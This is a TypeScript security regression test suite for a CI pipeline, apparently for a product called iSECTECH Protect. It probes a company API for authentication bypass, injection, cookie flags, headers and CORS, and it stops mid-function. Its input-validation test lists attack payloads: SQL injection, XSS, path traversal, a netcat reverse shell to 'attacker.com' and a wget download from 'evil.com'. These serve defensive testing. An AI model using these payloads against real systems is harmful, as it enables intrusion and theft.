/**
 * Security Regression Testing Automation
 * iSECTECH Protect - Automated security regression tests for CI/CD pipeline
 * 
 * Task: 90.7 - Set Up Security Regression Testing for CI/CD integration
 */

import { describe, expect, test, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import { execSync, spawn } from 'child_process';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { APIRequestContext, test as playwrightTest } from '@playwright/test';

interface SecurityRegressionTest {
  id: string;
  name: string;
  category: 'authentication' | 'authorization' | 'input_validation' | 'session_management' | 'cryptography' | 'configuration' | 'dependency' | 'infrastructure';
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
  testFunction: () => Promise<SecurityTestResult>;
  baseline?: SecurityTestResult;
  enabled: boolean;
}

interface SecurityTestResult {
  testId: string;
  passed: boolean;
  score: number; // 0-100
  vulnerabilities: VulnerabilityFinding[];
  metrics: SecurityMetrics;
  timestamp: string;
  executionTimeMs: number;
  environment: string;
}

interface VulnerabilityFinding {
  id: string;
  cveId?: string;
  title: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
  location: string;
  impact: string;
  remediation: string;
  confidence: number; // 0-100
  falsePositive: boolean;
  newInThisRun: boolean;
  resolvedFromPrevious: boolean;
}

interface SecurityMetrics {
  vulnerabilityCount: {
    critical: number;
    high: number;
    medium: number;
    low: number;
    total: number;
  };
  securityScore: number; // 0-100
  regressionDetected: boolean;
  newVulnerabilities: number;
  resolvedVulnerabilities: number;
  coverageMetrics: {
    endpointsCovered: number;
    totalEndpoints: number;
    coveragePercentage: number;
  };
  complianceScore: number; // 0-100
}

interface RegressionTestReport {
  timestamp: string;
  buildId: string;
  commitHash: string;
  branch: string;
  environment: string;
  testResults: SecurityTestResult[];
  overallScore: number;
  regressionDetected: boolean;
  summary: {
    totalTests: number;
    passed: number;
    failed: number;
    newVulnerabilities: number;
    resolvedVulnerabilities: number;
    criticalIssues: number;
  };
  recommendations: string[];
  complianceStatus: {
    [framework: string]: {
      score: number;
      status: 'PASS' | 'FAIL' | 'WARNING';
      requirements: string[];
    };
  };
  actionRequired: boolean;
  blockDeployment: boolean;
}

class SecurityRegressionAutomation {
  private baseURL: string;
  private authToken: string = '';
  private previousResults: Map<string, SecurityTestResult> = new Map();
  private regressionTests: SecurityRegressionTest[] = [];
  private environment: string;
  private buildId: string;
  private commitHash: string;
  private branch: string;

  constructor(environment: string = 'ci') {
    this.baseURL = this.getBaseURL(environment);
    this.environment = environment;
    this.buildId = process.env.BUILD_ID || crypto.randomUUID();
    this.commitHash = this.getCommitHash();
    this.branch = this.getBranch();
    
    this.initializeRegressionTests();
    this.loadPreviousResults();
  }

  private getBaseURL(environment: string): string {
    switch (environment) {
      case 'production':
        return process.env.PROD_API_URL || 'https://api.isectech.com';
      case 'staging':
        return process.env.STAGING_API_URL || 'https://staging.isectech.com';
      case 'development':
        return process.env.DEV_API_URL || 'http://localhost:3000';
      case 'ci':
      default:
        return process.env.CI_API_URL || 'http://localhost:8080';
    }
  }

  private getCommitHash(): string {
    try {
      return execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();
    } catch (error) {
      return 'unknown';
    }
  }

  private getBranch(): string {
    try {
      return execSync('git rev-parse --abbrev-ref HEAD', { encoding: 'utf8' }).trim();
    } catch (error) {
      return 'unknown';
    }
  }

  private initializeRegressionTests(): void {
    this.regressionTests = [
      {
        id: 'auth-001',
        name: 'Authentication Bypass Regression',
        category: 'authentication',
        severity: 'CRITICAL',
        description: 'Verify no authentication bypass vulnerabilities have been introduced',
        testFunction: this.testAuthenticationBypass.bind(this),
        enabled: true
      },
      {
        id: 'authz-001',
        name: 'Authorization Matrix Integrity',
        category: 'authorization',
        severity: 'CRITICAL',
        description: 'Ensure authorization matrix remains properly configured',
        testFunction: this.testAuthorizationMatrix.bind(this),
        enabled: true
      },
      {
        id: 'input-001',
        name: 'Input Validation Regression',
        category: 'input_validation',
        severity: 'HIGH',
        description: 'Check for SQL injection, XSS, and command injection vulnerabilities',
        testFunction: this.testInputValidation.bind(this),
        enabled: true
      },
      {
        id: 'session-001',
        name: 'Session Management Security',
        category: 'session_management',
        severity: 'HIGH',
        description: 'Validate session handling, fixation, and hijacking protections',
        testFunction: this.testSessionManagement.bind(this),
        enabled: true
      },
      {
        id: 'crypto-001',
        name: 'Cryptographic Implementation',
        category: 'cryptography',
        severity: 'HIGH',
        description: 'Verify cryptographic controls and implementations',
        testFunction: this.testCryptographicControls.bind(this),
        enabled: true
      },
      {
        id: 'config-001',
        name: 'Security Configuration',
        category: 'configuration',
        severity: 'MEDIUM',
        description: 'Check for security misconfigurations and hardening',
        testFunction: this.testSecurityConfiguration.bind(this),
        enabled: true
      },
      {
        id: 'deps-001',
        name: 'Dependency Vulnerability Check',
        category: 'dependency',
        severity: 'HIGH',
        description: 'Scan for known vulnerabilities in dependencies',
        testFunction: this.testDependencyVulnerabilities.bind(this),
        enabled: true
      },
      {
        id: 'infra-001',
        name: 'Infrastructure Security',
        category: 'infrastructure',
        severity: 'MEDIUM',
        description: 'Validate infrastructure security controls',
        testFunction: this.testInfrastructureSecurity.bind(this),
        enabled: true
      },
      {
        id: 'api-001',
        name: 'API Security Regression',
        category: 'configuration',
        severity: 'CRITICAL',
        description: 'Comprehensive API security validation',
        testFunction: this.testAPISecurityRegression.bind(this),
        enabled: true
      },
      {
        id: 'tenant-001',
        name: 'Multi-tenant Isolation',
        category: 'authorization',
        severity: 'CRITICAL',
        description: 'Verify tenant isolation remains intact',
        testFunction: this.testTenantIsolation.bind(this),
        enabled: true
      }
    ];
  }

  private loadPreviousResults(): void {
    try {
      const resultsPath = path.join(__dirname, '../../test-results/security-regression-baseline.json');
      if (fs.existsSync(resultsPath)) {
        const previousData = JSON.parse(fs.readFileSync(resultsPath, 'utf8'));
        previousData.testResults.forEach((result: SecurityTestResult) => {
          this.previousResults.set(result.testId, result);
        });
        console.log(`📊 Loaded ${this.previousResults.size} previous test results for regression comparison`);
      }
    } catch (error) {
      console.warn('⚠️ Could not load previous test results, running baseline comparison');
    }
  }

  // Authentication Bypass Testing
  private async testAuthenticationBypass(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    const protectedEndpoints = [
      '/api/auth/verify',
      '/api/user/profile',
      '/api/admin/users',
      '/api/assets',
      '/api/threats',
      '/api/security/alerts'
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        // Test 1: No authentication header
        const response1 = await fetch(`${this.baseURL}${endpoint}`, {
          method: 'GET',
          headers: { 'Content-Type': 'application/json' }
        });

        if (response1.status === 200) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `Authentication bypass on ${endpoint}`,
            severity: 'CRITICAL',
            description: `Endpoint ${endpoint} accessible without authentication`,
            location: endpoint,
            impact: 'Complete authentication bypass allowing unauthorized access',
            remediation: 'Implement proper authentication middleware on all protected endpoints',
            confidence: 95,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('auth-bypass-' + endpoint),
            resolvedFromPrevious: false
          });
          score -= 20;
        }

        // Test 2: Invalid JWT token
        const response2 = await fetch(`${this.baseURL}${endpoint}`, {
          method: 'GET',
          headers: {
            'Authorization': 'Bearer invalid.jwt.token',
            'Content-Type': 'application/json'
          }
        });

        if (response2.status === 200) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `Invalid JWT accepted on ${endpoint}`,
            severity: 'CRITICAL',
            description: `Endpoint ${endpoint} accepts invalid JWT tokens`,
            location: endpoint,
            impact: 'JWT validation bypass allowing unauthorized access',
            remediation: 'Implement proper JWT validation and signature verification',
            confidence: 90,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('jwt-bypass-' + endpoint),
            resolvedFromPrevious: false
          });
          score -= 15;
        }

        // Test 3: Expired token
        const expiredToken = this.generateExpiredJWT();
        const response3 = await fetch(`${this.baseURL}${endpoint}`, {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${expiredToken}`,
            'Content-Type': 'application/json'
          }
        });

        if (response3.status === 200) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `Expired JWT accepted on ${endpoint}`,
            severity: 'HIGH',
            description: `Endpoint ${endpoint} accepts expired JWT tokens`,
            location: endpoint,
            impact: 'Session management vulnerability allowing stale token usage',
            remediation: 'Implement proper JWT expiration validation',
            confidence: 85,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('expired-jwt-' + endpoint),
            resolvedFromPrevious: false
          });
          score -= 10;
        }

      } catch (error) {
        console.warn(`Authentication test failed for ${endpoint}:`, error);
      }
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;
    
    return {
      testId: 'auth-001',
      passed: vulnerabilities.filter(v => v.severity === 'CRITICAL' || v.severity === 'HIGH').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0, // Would be calculated from comparison
        coverageMetrics: {
          endpointsCovered: protectedEndpoints.length,
          totalEndpoints: protectedEndpoints.length,
          coveragePercentage: 100
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Authorization Matrix Testing
  private async testAuthorizationMatrix(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Load and test authorization matrix
    try {
      const matrixPath = path.join(__dirname, '../../api-gateway/security/authorization-matrix.json');
      const matrix = JSON.parse(fs.readFileSync(matrixPath, 'utf8'));
      
      // Test sample endpoints from matrix
      const testEndpoints = [
        { path: '/api/admin/users', method: 'GET', requiresAdmin: true },
        { path: '/api/security/alerts', method: 'GET', requiresSecurityOfficer: true },
        { path: '/api/assets', method: 'GET', requiresAuth: true },
        { path: '/api/health', method: 'GET', isPublic: true }
      ];

      for (const endpoint of testEndpoints) {
        // Test with insufficient privileges
        if (!endpoint.isPublic) {
          const userToken = this.generateUserJWT('user', ['user']);
          const response = await fetch(`${this.baseURL}${endpoint.path}`, {
            method: endpoint.method,
            headers: {
              'Authorization': `Bearer ${userToken}`,
              'Content-Type': 'application/json'
            }
          });

          if (endpoint.requiresAdmin && response.status === 200) {
            vulnerabilities.push({
              id: crypto.randomUUID(),
              title: `Authorization bypass on admin endpoint ${endpoint.path}`,
              severity: 'CRITICAL',
              description: `Regular user can access admin endpoint ${endpoint.path}`,
              location: endpoint.path,
              impact: 'Privilege escalation vulnerability',
              remediation: 'Implement proper role-based access control',
              confidence: 95,
              falsePositive: false,
              newInThisRun: !this.wasVulnerabilityInPrevious('authz-bypass-' + endpoint.path),
              resolvedFromPrevious: false
            });
            score -= 25;
          }

          if (endpoint.requiresSecurityOfficer && response.status === 200) {
            vulnerabilities.push({
              id: crypto.randomUUID(),
              title: `Security officer endpoint accessible to regular user ${endpoint.path}`,
              severity: 'CRITICAL',
              description: `Regular user can access security officer endpoint ${endpoint.path}`,
              location: endpoint.path,
              impact: 'Critical security information disclosure',
              remediation: 'Implement proper security clearance validation',
              confidence: 90,
              falsePositive: false,
              newInThisRun: !this.wasVulnerabilityInPrevious('sec-bypass-' + endpoint.path),
              resolvedFromPrevious: false
            });
            score -= 30;
          }
        }
      }

    } catch (error) {
      vulnerabilities.push({
        id: crypto.randomUUID(),
        title: 'Authorization matrix loading failure',
        severity: 'HIGH',
        description: 'Could not load or parse authorization matrix',
        location: 'authorization-matrix.json',
        impact: 'Unable to validate authorization configuration',
        remediation: 'Fix authorization matrix configuration file',
        confidence: 100,
        falsePositive: false,
        newInThisRun: true,
        resolvedFromPrevious: false
      });
      score -= 20;
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'authz-001',
      passed: vulnerabilities.filter(v => v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 4,
          totalEndpoints: 10,
          coveragePercentage: 40
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Input Validation Testing
  private async testInputValidation(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    const maliciousPayloads = {
      sql: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --"
      ],
      xss: [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')"
      ],
      command: [
        "; cat /etc/passwd",
        "| nc -e /bin/sh attacker.com 4444",
        "&& wget http://evil.com/shell"
      ],
      path: [
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      ]
    };

    const testEndpoints = [
      '/api/search',
      '/api/assets',
      '/api/user/profile',
      '/api/notifications'
    ];

    for (const endpoint of testEndpoints) {
      const userToken = this.generateUserJWT('testuser', ['user']);
      
      // Test SQL injection
      for (const payload of maliciousPayloads.sql) {
        try {
          const response = await fetch(`${this.baseURL}${endpoint}?q=${encodeURIComponent(payload)}`, {
            method: 'GET',
            headers: {
              'Authorization': `Bearer ${userToken}`,
              'Content-Type': 'application/json'
            }
          });

          const responseText = await response.text().catch(() => '');
          if (response.status === 500 || /SQL|syntax|mysql|postgresql/i.test(responseText)) {
            vulnerabilities.push({
              id: crypto.randomUUID(),
              title: `SQL injection vulnerability on ${endpoint}`,
              severity: 'CRITICAL',
              description: `Endpoint ${endpoint} vulnerable to SQL injection with payload: ${payload}`,
              location: endpoint,
              impact: 'Database compromise, data exfiltration, data manipulation',
              remediation: 'Use parameterized queries and input validation',
              confidence: 80,
              falsePositive: false,
              newInThisRun: !this.wasVulnerabilityInPrevious('sql-inj-' + endpoint),
              resolvedFromPrevious: false
            });
            score -= 25;
          }
        } catch (error) {
          // Network errors don't indicate vulnerability
        }
      }

      // Test XSS
      for (const payload of maliciousPayloads.xss) {
        try {
          const response = await fetch(`${this.baseURL}${endpoint}`, {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${userToken}`,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: payload, title: payload })
          });

          const responseText = await response.text().catch(() => '');
          if (responseText.includes(payload) && !responseText.includes('&lt;script&gt;')) {
            vulnerabilities.push({
              id: crypto.randomUUID(),
              title: `XSS vulnerability on ${endpoint}`,
              severity: 'HIGH',
              description: `Endpoint ${endpoint} reflects unescaped user input`,
              location: endpoint,
              impact: 'Cross-site scripting, session hijacking, defacement',
              remediation: 'Implement proper output encoding and Content Security Policy',
              confidence: 75,
              falsePositive: false,
              newInThisRun: !this.wasVulnerabilityInPrevious('xss-' + endpoint),
              resolvedFromPrevious: false
            });
            score -= 15;
          }
        } catch (error) {
          // Network errors don't indicate vulnerability
        }
      }
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'input-001',
      passed: vulnerabilities.filter(v => v.severity === 'CRITICAL' || v.severity === 'HIGH').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: testEndpoints.length,
          totalEndpoints: testEndpoints.length,
          coveragePercentage: 100
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Session Management Testing
  private async testSessionManagement(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    try {
      // Test session fixation
      const loginResponse = await fetch(`${this.baseURL}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'test@isectech.com',
          password: 'TestPassword123!',
          sessionId: 'fixed-session-id'
        })
      });

      if (loginResponse.status === 200) {
        const setCookieHeader = loginResponse.headers.get('set-cookie');
        if (setCookieHeader && setCookieHeader.includes('fixed-session-id')) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: 'Session fixation vulnerability',
            severity: 'HIGH',
            description: 'Application accepts user-provided session IDs',
            location: '/api/auth/login',
            impact: 'Session hijacking and impersonation attacks',
            remediation: 'Generate new session ID upon authentication',
            confidence: 90,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('session-fixation'),
            resolvedFromPrevious: false
          });
          score -= 20;
        }
      }

      // Test for secure cookie flags
      const cookieHeaders = loginResponse.headers.get('set-cookie');
      if (cookieHeaders) {
        if (!cookieHeaders.includes('Secure')) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: 'Session cookie missing Secure flag',
            severity: 'MEDIUM',
            description: 'Session cookies transmitted over unencrypted connections',
            location: '/api/auth/login',
            impact: 'Session token interception over HTTP',
            remediation: 'Set Secure flag on all session cookies',
            confidence: 100,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('cookie-secure'),
            resolvedFromPrevious: false
          });
          score -= 10;
        }

        if (!cookieHeaders.includes('HttpOnly')) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: 'Session cookie missing HttpOnly flag',
            severity: 'MEDIUM',
            description: 'Session cookies accessible via JavaScript',
            location: '/api/auth/login',
            impact: 'XSS-based session token theft',
            remediation: 'Set HttpOnly flag on session cookies',
            confidence: 100,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('cookie-httponly'),
            resolvedFromPrevious: false
          });
          score -= 10;
        }
      }

    } catch (error) {
      console.warn('Session management test failed:', error);
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'session-001',
      passed: vulnerabilities.filter(v => v.severity === 'HIGH' || v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 1,
          totalEndpoints: 3,
          coveragePercentage: 33
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Cryptographic Controls Testing
  private async testCryptographicControls(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Test HTTPS enforcement
    try {
      const httpUrl = this.baseURL.replace('https://', 'http://');
      const response = await fetch(`${httpUrl}/api/health`, { 
        method: 'GET',
        redirect: 'manual'
      });

      if (response.status === 200 && !response.url.startsWith('https://')) {
        vulnerabilities.push({
          id: crypto.randomUUID(),
          title: 'Missing HTTPS enforcement',
          severity: 'HIGH',
          description: 'Application serves content over HTTP',
          location: 'Server configuration',
          impact: 'Man-in-the-middle attacks, data interception',
          remediation: 'Implement HTTPS redirect and HSTS header',
          confidence: 100,
          falsePositive: false,
          newInThisRun: !this.wasVulnerabilityInPrevious('https-missing'),
          resolvedFromPrevious: false
        });
        score -= 20;
      }
    } catch (error) {
      // HTTPS-only is good if HTTP fails
    }

    // Test for weak TLS configuration
    try {
      const response = await fetch(`${this.baseURL}/api/health`);
      const securityHeaders = {
        'strict-transport-security': response.headers.get('strict-transport-security'),
        'content-security-policy': response.headers.get('content-security-policy'),
        'x-content-type-options': response.headers.get('x-content-type-options'),
        'x-frame-options': response.headers.get('x-frame-options'),
        'x-xss-protection': response.headers.get('x-xss-protection')
      };

      if (!securityHeaders['strict-transport-security']) {
        vulnerabilities.push({
          id: crypto.randomUUID(),
          title: 'Missing HSTS header',
          severity: 'MEDIUM',
          description: 'HTTP Strict Transport Security not enforced',
          location: 'HTTP headers',
          impact: 'Protocol downgrade attacks',
          remediation: 'Implement HSTS header with appropriate max-age',
          confidence: 100,
          falsePositive: false,
          newInThisRun: !this.wasVulnerabilityInPrevious('hsts-missing'),
          resolvedFromPrevious: false
        });
        score -= 10;
      }

      if (!securityHeaders['content-security-policy']) {
        vulnerabilities.push({
          id: crypto.randomUUID(),
          title: 'Missing Content Security Policy',
          severity: 'MEDIUM',
          description: 'No CSP header found',
          location: 'HTTP headers',
          impact: 'XSS and code injection attacks',
          remediation: 'Implement comprehensive Content Security Policy',
          confidence: 100,
          falsePositive: false,
          newInThisRun: !this.wasVulnerabilityInPrevious('csp-missing'),
          resolvedFromPrevious: false
        });
        score -= 10;
      }

    } catch (error) {
      console.warn('Cryptographic controls test failed:', error);
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'crypto-001',
      passed: vulnerabilities.filter(v => v.severity === 'HIGH' || v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 1,
          totalEndpoints: 5,
          coveragePercentage: 20
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Security Configuration Testing
  private async testSecurityConfiguration(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Check for information disclosure in error responses
    try {
      const response = await fetch(`${this.baseURL}/api/nonexistent`, {
        method: 'GET'
      });

      const responseText = await response.text();
      if (/stack trace|at\s+.*\s+\(.*:\d+:\d+\)|Exception|Error:/i.test(responseText)) {
        vulnerabilities.push({
          id: crypto.randomUUID(),
          title: 'Information disclosure in error responses',
          severity: 'MEDIUM',
          description: 'Error responses contain sensitive debugging information',
          location: 'Error handling',
          impact: 'Information leakage for reconnaissance',
          remediation: 'Implement generic error messages for production',
          confidence: 90,
          falsePositive: false,
          newInThisRun: !this.wasVulnerabilityInPrevious('info-disclosure'),
          resolvedFromPrevious: false
        });
        score -= 10;
      }

      // Check for server version disclosure
      const serverHeader = response.headers.get('server');
      const poweredByHeader = response.headers.get('x-powered-by');
      
      if (serverHeader || poweredByHeader) {
        vulnerabilities.push({
          id: crypto.randomUUID(),
          title: 'Server information disclosure',
          severity: 'LOW',
          description: 'Server headers reveal technology stack information',
          location: 'HTTP headers',
          impact: 'Reconnaissance information for attackers',
          remediation: 'Remove or obfuscate server identification headers',
          confidence: 100,
          falsePositive: false,
          newInThisRun: !this.wasVulnerabilityInPrevious('server-disclosure'),
          resolvedFromPrevious: false
        });
        score -= 5;
      }

    } catch (error) {
      console.warn('Security configuration test failed:', error);
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'config-001',
      passed: vulnerabilities.filter(v => v.severity === 'HIGH' || v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 2,
          totalEndpoints: 10,
          coveragePercentage: 20
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Dependency Vulnerability Testing
  private async testDependencyVulnerabilities(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    try {
      // Run npm audit
      const auditResult = execSync('npm audit --json', { 
        encoding: 'utf8',
        cwd: process.cwd(),
        timeout: 30000
      });
      
      const auditData = JSON.parse(auditResult);
      
      if (auditData.vulnerabilities) {
        Object.entries(auditData.vulnerabilities).forEach(([packageName, vulnData]: [string, any]) => {
          vulnData.via.forEach((via: any) => {
            if (typeof via === 'object' && via.severity) {
              const severity = this.mapSeverity(via.severity);
              
              vulnerabilities.push({
                id: crypto.randomUUID(),
                cveId: via.source?.toString(),
                title: `Vulnerable dependency: ${packageName}`,
                severity,
                description: via.title || `Security vulnerability in ${packageName}`,
                location: `node_modules/${packageName}`,
                impact: via.description || 'Potential security compromise through vulnerable dependency',
                remediation: via.fixAvailable ? 'Update package to latest version' : 'Review and assess risk, consider alternative packages',
                confidence: 95,
                falsePositive: false,
                newInThisRun: !this.wasVulnerabilityInPrevious('dep-' + packageName),
                resolvedFromPrevious: false
              });

              // Decrease score based on severity
              const scoreDecrease = { 'CRITICAL': 25, 'HIGH': 15, 'MEDIUM': 10, 'LOW': 5 };
              score -= scoreDecrease[severity] || 5;
            }
          });
        });
      }

    } catch (error) {
      console.warn('Dependency vulnerability scan failed:', error);
      vulnerabilities.push({
        id: crypto.randomUUID(),
        title: 'Dependency vulnerability scan failed',
        severity: 'MEDIUM',
        description: 'Unable to perform dependency vulnerability assessment',
        location: 'package.json',
        impact: 'Unknown vulnerability status in dependencies',
        remediation: 'Fix npm audit execution and ensure proper dependency management',
        confidence: 100,
        falsePositive: false,
        newInThisRun: true,
        resolvedFromPrevious: false
      });
      score -= 15;
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'deps-001',
      passed: vulnerabilities.filter(v => v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 0,
          totalEndpoints: 0,
          coveragePercentage: 0
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // Infrastructure Security Testing
  private async testInfrastructureSecurity(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Test for common security misconfigurations
    const securityTests = [
      {
        name: 'CORS Configuration',
        test: async () => {
          const response = await fetch(`${this.baseURL}/api/health`, {
            method: 'OPTIONS',
            headers: {
              'Origin': 'https://malicious-site.com',
              'Access-Control-Request-Method': 'GET'
            }
          });
          
          const corsHeader = response.headers.get('access-control-allow-origin');
          if (corsHeader === '*') {
            return {
              vulnerable: true,
              severity: 'MEDIUM' as const,
              description: 'Overly permissive CORS policy allows all origins'
            };
          }
          return { vulnerable: false };
        }
      },
      {
        name: 'Rate Limiting',
        test: async () => {
          let consecutiveSuccess = 0;
          
          for (let i = 0; i < 20; i++) {
            const response = await fetch(`${this.baseURL}/api/health`);
            if (response.status === 200) {
              consecutiveSuccess++;
            } else if (response.status === 429) {
              break;
            }
          }
          
          if (consecutiveSuccess >= 15) {
            return {
              vulnerable: true,
              severity: 'MEDIUM' as const,
              description: 'No rate limiting detected after 15+ consecutive requests'
            };
          }
          return { vulnerable: false };
        }
      }
    ];

    for (const secTest of securityTests) {
      try {
        const result = await secTest.test();
        if (result.vulnerable) {
          vulnerabilities.push({
            id: crypto.randomUUID(),
            title: `${secTest.name} misconfiguration`,
            severity: result.severity,
            description: result.description,
            location: 'Infrastructure configuration',
            impact: 'Security control bypass',
            remediation: `Review and fix ${secTest.name} configuration`,
            confidence: 80,
            falsePositive: false,
            newInThisRun: !this.wasVulnerabilityInPrevious('infra-' + secTest.name.toLowerCase().replace(' ', '-')),
            resolvedFromPrevious: false
          });
          score -= result.severity === 'HIGH' ? 20 : 10;
        }
      } catch (error) {
        console.warn(`Infrastructure test failed for ${secTest.name}:`, error);
      }
    }

    const executionTime = Date.now() - startTime;
    const newVulns = vulnerabilities.filter(v => v.newInThisRun).length;

    return {
      testId: 'infra-001',
      passed: vulnerabilities.filter(v => v.severity === 'HIGH' || v.severity === 'CRITICAL').length === 0,
      score: Math.max(0, score),
      vulnerabilities,
      metrics: {
        vulnerabilityCount: this.countVulnerabilities(vulnerabilities),
        securityScore: Math.max(0, score),
        regressionDetected: newVulns > 0,
        newVulnerabilities: newVulns,
        resolvedVulnerabilities: 0,
        coverageMetrics: {
          endpointsCovered: 1,
          totalEndpoints: 5,
          coveragePercentage: 20
        },
        complianceScore: Math.max(0, score)
      },
      timestamp: new Date().toISOString(),
      executionTimeMs: executionTime,
      environment: this.environment
    };
  }

  // API Security Regression Testing
  private async testAPISecurityRegression(): Promise<SecurityTestResult> {
    const startTime = Date.now();
    const vulnerabilities: VulnerabilityFinding[] = [];
    let score = 100;

    // Run comprehensive API security tests
    try {
      const apiEndpoints = [
        '/api/auth/login',
        '/api/assets',
        '/api/threats',
        '/api/user/profile',
        '/api/admin/users'
      ];

      for (const endpoint of apiEndpoints) {
        // Test for HTTP methods not explicitly allowed
        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE'];
